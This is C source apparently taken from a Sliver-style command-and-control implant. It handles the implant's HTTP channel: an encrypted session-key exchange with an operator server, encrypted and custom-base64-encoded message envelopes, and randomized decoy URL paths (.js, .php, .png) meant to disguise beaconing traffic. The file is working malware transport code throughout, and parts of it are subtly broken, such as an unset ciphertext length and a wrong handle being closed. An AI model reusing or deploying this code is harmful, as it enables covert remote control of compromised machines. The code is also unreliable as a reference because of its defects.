BOOL HttpSend
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_HTTP_CLIENT pHttpClient,
	_In_ PENVELOPE pEnvelope
)
{
	PBUFFER pMarshalledEnvelope = NULL;
	DWORD cbCipherText = 0;
	PBUFFER pCipherText = NULL;
	LPSTR lpEncodedData = NULL;
	LPSTR lpUri = NULL;
	PURI pUri = NULL;
	PHTTP_RESP pResp = NULL;
	BOOL Result = FALSE;

	if (pEnvelope == NULL) {
		goto CLEANUP;
	}

	if (pEnvelope->pData != NULL) {
		PrintFormatW(L"Write Envelope:\n");
		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
	}
	else {
		PrintFormatW(L"Write Envelope: []\n");
	}

	pMarshalledEnvelope = MarshalEnvelope(pEnvelope);
	pCipherText = SliverEncrypt(pConfig, pMarshalledEnvelope);
	lpUri = CreateSessionURL(pHttpClient);
	if (lpUri == NULL) {
		goto CLEANUP;
	}

	pUri = UriInit(lpUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	lpEncodedData = SliverBase64Encode(pCipherText, cbCipherText);
	pResp = SendHttpRequest(&pHttpClient->pHttpConfig, pHttpClient->pHttpClient, pUri->lpPathWithQuery, "POST", NULL, lpEncodedData, lstrlenA(lpEncodedData), FALSE, FALSE);
	if (pResp == NULL || (pResp->dwStatusCode != HTTP_STATUS_OK && pResp->dwStatusCode != HTTP_STATUS_ACCEPTED)) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	if (lpUri != NULL) {
		FREE(lpUri);
	}

	if (lpEncodedData != NULL) {
		FREE(lpEncodedData);
	}

	FreeUri(pUri);
	FreeBuffer(pCipherText);
	FreeBuffer(pMarshalledEnvelope);
	FreeHttpResp(pResp);

	return Result;
}

BOOL HttpClose
(
	_In_ PSLIVER_HTTP_CLIENT pSliverHttpClient
)
{
	PHTTP_CLIENT pHttpClient = NULL;

	if (pSliverHttpClient != NULL && pSliverHttpClient->pHttpClient != NULL) {
		pHttpClient = pSliverHttpClient->pHttpClient;
		if (pHttpClient->hConnection != NULL) {
			WinHttpCloseHandle(pHttpClient->hConnection);
			pHttpClient->hConnection = NULL;
		}

		if (pHttpClient->pHttpSession->hSession != NULL) {
			WinHttpCloseHandle(pHttpClient->hConnection);
			pHttpClient->hConnection = NULL;
		}
	}

	return TRUE;
}

VOID FreeHttpConfig
(
	_In_ PHTTP_CONFIG pHttpConfig
)
{
	DWORD i = 0;
	if (pHttpConfig != NULL) {
		if (pHttpConfig->lpUserAgent != NULL) {
			FREE(pHttpConfig->lpUserAgent);
		}

		if (pHttpConfig->lpAccessToken != NULL) {
			FREE(pHttpConfig->lpAccessToken);
		}

		for (i = 0; i < _countof(pHttpConfig->AdditionalHeaders); i++) {
			if (pHttpConfig->AdditionalHeaders[i] != NULL) {
				FREE(pHttpConfig->AdditionalHeaders[i]);
			}
		}

		FREE(pHttpConfig);
	}
}

BOOL HttpCleanup
(
	_In_ PSLIVER_HTTP_CLIENT pSliverHttpClient
)
{
	DWORD i = 0;
	if (pSliverHttpClient != NULL) {
		if (pSliverHttpClient->lpCookiePrefix != NULL) {
			FREE(pSliverHttpClient->lpCookiePrefix);
		}

		if (pSliverHttpClient->lpPathPrefix != NULL) {
			FREE(pSliverHttpClient->lpPathPrefix);
		}

		if (pSliverHttpClient->lpHostName != NULL) {
			FREE(pSliverHttpClient->lpHostName);
		}

		for (i = 0; i < _countof(pSliverHttpClient->PollPaths); i++) {
			if (pSliverHttpClient->PollPaths[i] != NULL) {
				FREE(pSliverHttpClient->PollPaths[i]);
			}
		}

		for (i = 0; i < _countof(pSliverHttpClient->PollFiles); i++) {
			if (pSliverHttpClient->PollFiles[i] != NULL) {
				FREE(pSliverHttpClient->PollFiles[i]);
			}
		}

		for (i = 0; i < _countof(pSliverHttpClient->SessionPaths); i++) {
			if (pSliverHttpClient->SessionPaths[i] != NULL) {
				FREE(pSliverHttpClient->SessionPaths[i]);
			}
		}

		for (i = 0; i < _countof(pSliverHttpClient->SessionFiles); i++) {
			if (pSliverHttpClient->SessionFiles[i] != NULL) {
				FREE(pSliverHttpClient->SessionFiles[i]);
			}
		}

		for (i = 0; i < _countof(pSliverHttpClient->ClosePaths); i++) {
			if (pSliverHttpClient->ClosePaths[i] != NULL) {
				FREE(pSliverHttpClient->ClosePaths[i]);
			}
		}

		for (i = 0; i < _countof(pSliverHttpClient->CloseFiles); i++) {
			if (pSliverHttpClient->CloseFiles[i] != NULL) {
				FREE(pSliverHttpClient->CloseFiles[i]);
			}
		}

		FreeHttpConfig(pSliverHttpClient->pHttpConfig);
		FreeHttpClient(pSliverHttpClient->pHttpClient);
		FREE(pSliverHttpClient);
	}

	return TRUE;
}

BOOL HttpStart
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_HTTP_CLIENT pHttpClient
)
{
	LPSTR lpFullUri = NULL;
	PURI pUri = NULL;
	DWORD cbResp = 0;
	LPSTR lpEncodedSessionKey = NULL;
	BOOL Result = FALSE;
	PHTTP_RESP pResp = NULL;
	PBUFFER pDecodedResp = NULL;
	DWORD cbDecodedResp = 0;
	PWEB_PROXY pProxyConfig = NULL;
	PBUFFER pSessionId = NULL;
	PBYTE pEncryptedSessionInit = NULL;
	LPSTR lpRespData = NULL;
	DWORD cbEncryptedSessionInit = 0;
	PPBElement pMarshalledData = NULL;
	DWORD dwSetCookieLength = 0;
	WCHAR wszSetCookie[0x100];
	LPWSTR lpTemp = NULL;

	lpFullUri = StartSessionURL(pHttpClient);
	if (lpFullUri == NULL) {
		goto CLEANUP;
	}

	pUri = UriInit(lpFullUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient->pHttpClient = HttpClientInit(pUri, pHttpClient->pHttpConfig->pProxyConfig);
	if (pHttpClient->pHttpClient == NULL) {
		goto CLEANUP;
	}

	pMarshalledData = CreateBytesElement(pConfig->pSessionKey, CHACHA20_KEY_SIZE, 1);
	pEncryptedSessionInit = AgeKeyExToServer(pConfig->lpRecipientPubKey, pConfig->lpPeerPrivKey, pConfig->lpPeerPubKey, pMarshalledData->pMarshalledData, pMarshalledData->cbMarshalledData, &cbEncryptedSessionInit);
	if (pEncryptedSessionInit == NULL || cbEncryptedSessionInit == 0) {
		goto CLEANUP;
	}

	lpEncodedSessionKey = SliverBase64Encode(pEncryptedSessionInit, cbEncryptedSessionInit);
	pResp = SendHttpRequest(&pHttpClient->pHttpConfig, pHttpClient->pHttpClient, NULL, "POST", NULL, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), FALSE, TRUE);
	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	lpRespData = ExtractSubStrA(pResp->pRespData, pResp->cbResp);
	pDecodedResp = SliverBase64Decode(lpRespData);
	pSessionId = SliverDecrypt(pConfig, pDecodedResp);
	memcpy(pConfig->szSessionID, pSessionId->pBuffer, pSessionId->cbBuffer);
	dwSetCookieLength = sizeof(wszSetCookie);
	SecureZeroMemory(wszSetCookie, sizeof(wszSetCookie));
	if (!WinHttpQueryHeaders(pResp->hRequest, WINHTTP_QUERY_SET_COOKIE, NULL, wszSetCookie, &dwSetCookieLength, WINHTTP_NO_HEADER_INDEX)) {
		LOG_ERROR("WinHttpQueryHeaders", GetLastError());
		goto CLEANUP;
	}

	lpTemp = StrChrW(wszSetCookie, L'=');
	lpTemp[0] = L'\0';
	pHttpClient->lpCookiePrefix = ConvertWcharToChar(wszSetCookie);
	Result = TRUE;
CLEANUP:
	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	if (lpEncodedSessionKey != NULL) {
		FREE(lpEncodedSessionKey);
	}

	if (lpFullUri != NULL) {
		FREE(lpFullUri);
	}

	if (pEncryptedSessionInit != NULL) {
		FREE(pEncryptedSessionInit);
	}

	FreeBuffer(pDecodedResp);
	FreeBuffer(pSessionId);
	FreeEnvelope(pMarshalledData);
	FreeHttpResp(pResp);
	return Result;
}

LPSTR JoinUrlPath
(
	_In_ PSLIVER_HTTP_CLIENT pClient,
	_In_ LPSTR* pSegments,
	_In_ DWORD cSegment
)
{
	LPSTR lpResult = NULL;
	DWORD cbResult = 0;
	DWORD dwPos = 0;
	DWORD cbPathPrefix = 0;
	DWORD i = 0;

	cbResult = 0x100;
	lpResult = ALLOC(cbResult + 1);
	if (pClient->lpPathPrefix != NULL && StrCmpA(pClient->lpPathPrefix, "/")) {
		cbPathPrefix = lstrlenA(pClient->lpPathPrefix);
		if (cbPathPrefix >= cbResult) {
			cbResult = cbPathPrefix * 2;
			lpResult = REALLOC(lpResult, cbResult + 1);
		}

		lstrcpyA(lpResult, pClient->lpPathPrefix);
		dwPos += cbPathPrefix;
		lstrcatA(lpResult, "/");
		dwPos++;
	}

	for (i = 0; i < cSegment; i++) {
		if (dwPos + lstrlenA(pSegments[i]) + 1 >= cbResult) {
			cbResult = (dwPos + lstrlenA(pSegments[i]) + 1) * 2;
			lpResult = REALLOC(lpResult, cbResult + 1);
		}

		lstrcatA(lpResult, pSegments[i]);
		dwPos += lstrlenA(pSegments[i]);
		if (i < cSegment - 1) {
			lstrcatA(lpResult, "/");
			dwPos++;
		}
	}

	return lpResult;
}

LPSTR* RandomUrlPath
(
	_In_ PSLIVER_HTTP_CLIENT pClient,
	_In_ LPSTR* pSegments,
	_In_ DWORD cSegments,
	_In_ LPSTR* pFileNames,
	_In_ DWORD cFileNames,
	_In_ LPSTR lpExtension,
	_Out_ PDWORD pcCountOfResult
)
{
	DWORD dwCountOfSegments = 0;
	DWORD i = 0;
	LPSTR* pResult = NULL;
	DWORD cResult = 0;
	LPSTR lpFileName = NULL;
	DWORD cbFileName = 0;

	pResult = ALLOC((pClient->dwMaxNumOfSegments + 1) * sizeof(LPSTR));
	if (cSegments > 0) {
		dwCountOfSegments = GenRandomNumber32(pClient->dwMinNumOfSegments, pClient->dwMaxNumOfSegments);
		for (i = 0; i < dwCountOfSegments; i++) {
			pResult[cResult++] = DuplicateStrA(pSegments[GenRandomNumber32(0, cSegments)], 0);
		}
	}

	pResult = REALLOC(pResult, (cResult + 1) * sizeof(LPSTR));
	lpFileName = DuplicateStrA(pFileNames[GenRandomNumber32(0, cFileNames)], lstrlenA(lpExtension) + 1);
	lstrcatA(lpFileName, ".");
	lstrcatA(lpFileName, lpExtension);
	pResult[cResult++] = lpFileName;
	if (pcCountOfResult != NULL) {
		*pcCountOfResult = cResult;
	}

	return pResult;
}

LPSTR ParseSegmentsUrl
(
	_In_ PSLIVER_HTTP_CLIENT pClient,
	_In_ SegmentType SegmentType
)
{
	DWORD dwNumOfSegments = 0;
	LPSTR* pSegments = NULL;
	DWORD i = 0;
	LPSTR lpResult = NULL;

	if (SegmentType == PollType) {
		pSegments = RandomUrlPath(pClient, pClient->PollPaths, pClient->cPollPaths, pClient->PollFiles, pClient->cPollFiles, "js", &dwNumOfSegments);
	}
	else if (SegmentType == SessionType) {
		pSegments = RandomUrlPath(pClient, pClient->SessionPaths, pClient->cSessionPaths, pClient->SessionFiles, pClient->cSessionFiles, "php", &dwNumOfSegments);
	}
	else if (SegmentType == CloseType) {
		pSegments = RandomUrlPath(pClient, pClient->ClosePaths, pClient->cClosePaths, pClient->CloseFiles, pClient->cCloseFiles, "png", &dwNumOfSegments);
	}
	else {
		goto CLEANUP;
	}

	lpResult = JoinUrlPath(pClient, pSegments, dwNumOfSegments);
CLEANUP:
	if (pSegments != NULL) {
		for (i = 0; i < dwNumOfSegments; i++) {
			FREE(pSegments[i]);
		}

		FREE(pSegments);
	}

	return lpResult;
}

LPSTR GenNonceQuery
(
	_In_ UINT64 uNonceID
)
{
	CHAR szNonceQueryArgChars[] = "abcdefghijklmnopqrstuvwxyz";
	DWORD i = 0;
	LPSTR lpResult = NULL;
	DWORD dwRandIdx = 0;
	LPSTR lpTemp = NULL;
	UINT64 uNonce = 0;

	uNonce = (((UINT64)GenRandomNumber32(0, 9999)) * 65537) + uNonceID;
	lpResult = ALLOC(100);
	wsprintfA(lpResult, "%lu", (DWORD)uNonce);
	for (i = 0; i < 3; i++) {
		lpTemp = lpResult;
		dwRandIdx = GenRandomNumber32(0, lstrlenA(lpTemp));
		lpResult = StrInsertCharA(lpResult, szNonceQueryArgChars[GenRandomNumber32(0, lstrlenA(szNonceQueryArgChars))], dwRandIdx);
		FREE(lpTemp);
	}

	return lpResult;
}

LPSTR CreatePollURL
(
	_In_ PSLIVER_HTTP_CLIENT pClient
)
{
	LPSTR lpUrlPath = NULL;
	LPSTR lpResult = NULL;
	LPSTR lpNonce = NULL;

	lpUrlPath = ParseSegmentsUrl(pClient, PollType);
	lpResult = DuplicateStrA(pClient->lpHostName, lstrlenA(lpUrlPath) + 100);
	lstrcatA(lpResult, "/");
	lstrcatA(lpResult, lpUrlPath);
	lstrcatA(lpResult, "?x=");
	lpNonce = GenNonceQuery(pClient->uEncoderNonce);
	lstrcatA(lpResult, lpNonce);
CLEANUP:
	if (lpNonce != NULL) {
		FREE(lpNonce);
	}

	if (lpUrlPath != NULL) {
		FREE(lpUrlPath);
	}

	return lpResult;
}

LPSTR CreateSessionURL
(
	_In_ PSLIVER_HTTP_CLIENT pClient
)
{
	LPSTR lpUrlPath = NULL;
	LPSTR lpResult = NULL;
	LPSTR lpNonce = NULL;

	lpUrlPath = ParseSegmentsUrl(pClient, SessionType);
	lpResult = DuplicateStrA(pClient->lpHostName, lstrlenA(lpUrlPath) + 100);
	lstrcatA(lpResult, "/");
	lstrcatA(lpResult, lpUrlPath);
	lstrcatA(lpResult, "?x=");
	lpNonce = GenNonceQuery(pClient->uEncoderNonce);
	lstrcatA(lpResult, lpNonce);
CLEANUP:
	if (lpNonce != NULL) {
		FREE(lpNonce);
	}

	if (lpUrlPath != NULL) {
		FREE(lpUrlPath);
	}

	return lpResult;
}

LPSTR StartSessionURL
(
	_In_ PSLIVER_HTTP_CLIENT pHttpClient
)
{
	LPSTR lpUrlPath = NULL;
	LPSTR lpTemp = NULL;
	LPSTR lpResult = NULL;
	LPSTR lpNonce = NULL;

	lpUrlPath = ParseSegmentsUrl(pHttpClient, SessionType);
	lpTemp = TrimSuffixA(lpUrlPath, "php", FALSE);
	FREE(lpUrlPath);
	lpUrlPath = lpTemp;
	lpUrlPath = REALLOC(lpUrlPath, lstrlenA(lpUrlPath) + 5);
	lstrcatA(lpUrlPath, "html");
	lpResult = DuplicateStrA(pHttpClient->lpHostName, lstrlenA(lpUrlPath) + 100);
	lstrcatA(lpResult, "/");
	lstrcatA(lpResult, lpUrlPath);
	lstrcatA(lpResult, "?t=");
	lpNonce = GenNonceQuery(pHttpClient->uEncoderNonce);
	lstrcatA(lpResult, lpNonce);
CLEANUP:
	if (lpNonce != NULL) {
		FREE(lpNonce);
	}

	if (lpUrlPath != NULL) {
		FREE(lpUrlPath);
	}

	return lpResult;
}

LPSTR SliverBase64Encode
(
	_In_ PBYTE lpInput,
	_In_ DWORD cbInput
)
{
	LPSTR lpResult = NULL;
	DWORD cbResult = 0;
	CHAR szOldCharSet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	CHAR szNewCharSet[] = "a0b2c5def6hijklmnopqr_st-uvwxyzA1B3C4DEFGHIJKLM7NO9PQR8ST+UVWXYZ";
	DWORD i = 0;
	DWORD dwPos = 0;

	lpResult = Base64Encode(lpInput, cbInput, TRUE);
	cbResult = lstrlenA(lpResult);
	for (i = 0; i < cbResult; i++) {
		dwPos = StrChrA(szOldCharSet, lpResult[i]) - szOldCharSet;
		lpResult[i] = szNewCharSet[dwPos];
	}

	return lpResult;
}

PMINISIGN_PUB_KEY DecodeMinisignPublicKey
(
	_In_ LPSTR lpInput
)
{
	PMINISIGN_PUB_KEY pResult = NULL;
	LPSTR* pSplittedArray = NULL;
	DWORD cbSplittedArray = 0;
	PBYTE pTemp = NULL;
	DWORD cbTemp = 0;
	DWORD i = 0;

	pSplittedArray = StrSplitNA(lpInput, "\n", 0, &cbSplittedArray);
	if (pSplittedArray == NULL || cbSplittedArray == 0) {
		goto CLEANUP;
	}

	pTemp = Base64Decode(pSplittedArray[1], &cbTemp);
	if (cbTemp != sizeof(MINISIGN_PUB_KEY)) {
		FREE(pTemp);
		goto CLEANUP;
	}

	pResult = (PMINISIGN_PUB_KEY)pTemp;
CLEANUP:
	if (pSplittedArray != NULL) {
		for (i = 0; i < cbSplittedArray; i++) {
			if (pSplittedArray[i] != NULL) {
				FREE(pSplittedArray[i]);
			}
		}

		FREE(pSplittedArray);
	}

	return pResult;
}

BOOL VerifySign
(
	_In_ PMINISIGN_PUB_KEY pPubKey,
	_In_ PBYTE pMessage,
	_In_ DWORD cbMessage,
	_In_ BOOL IsHashed
)
{
	UINT16 Algorithm;
	BYTE KeyID[8];
	BYTE Signature[ED25519_SIGNATURE_SIZE];
	BOOL Result = FALSE;
	PBYTE HashBuffer = NULL;
	PBYTE pBuffer = NULL;
	DWORD cbBuffer = 0;

	memcpy(&Algorithm, pMessage, sizeof(Algorithm));
	memcpy(KeyID, pMessage + sizeof(Algorithm), sizeof(KeyID));
	memcpy(Signature, pMessage + sizeof(Algorithm) + sizeof(KeyID), sizeof(Signature));
	if (memcmp(KeyID, pPubKey->KeyId, sizeof(KeyID))) {
		LogError(L"%s.%d: KeyID != pPubKey->KeyId\n", __FILE__, __LINE__);
		goto CLEANUP;
	}

	pBuffer = pMessage + sizeof(Algorithm) + sizeof(KeyID) + sizeof(Signature);
	cbBuffer = cbMessage - sizeof(Algorithm) - sizeof(KeyID) - sizeof(Signature);
	if (pPubKey->SignatureAlgorithm == HASH_EDDSA && !IsHashed) {
		HashBuffer = Blake2B(pMessage, cbMessage, NULL, 0);
		pBuffer = HashBuffer;
		cbBuffer = BLAKE2B_OUTBYTES;
	}

	Result = ED25519Verify(Signature, pBuffer, cbBuffer, pPubKey->PublicKey);
CLEANUP:
	if (HashBuffer != NULL) {
		FREE(HashBuffer);
	}

	return Result;
}